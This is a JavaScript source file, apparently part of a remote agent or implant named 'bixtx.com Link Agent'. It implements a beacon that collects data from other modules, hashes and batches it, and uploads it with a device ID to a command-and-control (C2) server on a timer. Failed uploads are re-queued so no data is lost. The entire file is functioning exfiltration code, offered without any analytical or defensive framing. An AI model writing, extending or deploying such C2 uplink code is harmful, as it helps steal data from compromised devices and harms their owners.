/**
 * bixtx.com Link Agent — Beacon / Data Uplink
 * Queues collected data and uploads to C2 in encrypted batches.
 */

const AgentCrypto = require("./crypto");
const config = require("../config");
const logger = require("../logger");

class Beacon {
  constructor(socket) {
    this.socket = socket;
    this.queue = [];
    this.flushTimer = null;
    this.maxQueueSize = 50;
    this.flushIntervalMs = config.beaconIntervalMs;
  }

  start() {
    this.flushTimer = setInterval(() => this._flush(), this.flushIntervalMs);
    logger.debug("Beacon started");
  }

  stop() {
    clearInterval(this.flushTimer);
    this._flush(); // final flush on stop
  }

  queue_data(module, data) {
    const entry = {
      module,
      data,
      ts: Date.now(),
      hash: AgentCrypto.hashData(data),
    };
    this.queue.push(entry);
    if (this.queue.length >= this.maxQueueSize) {
      this._flush();
    }
  }

  _flush() {
    if (this.queue.length === 0 || !this.socket.connected) return;
    const batch = this.queue.splice(0, this.maxQueueSize);
    const sent = this.socket.send("DATA_BATCH", {
      deviceId: config.deviceId,
      count: batch.length,
      items: batch,
    });
    if (!sent) {
      // Re-queue on failure
      this.queue.unshift(...batch);
      logger.warn("Beacon flush failed — data re-queued");
    } else {
      logger.debug(`Beacon flushed ${batch.length} items`);
    }
  }
}

module.exports = Beacon;
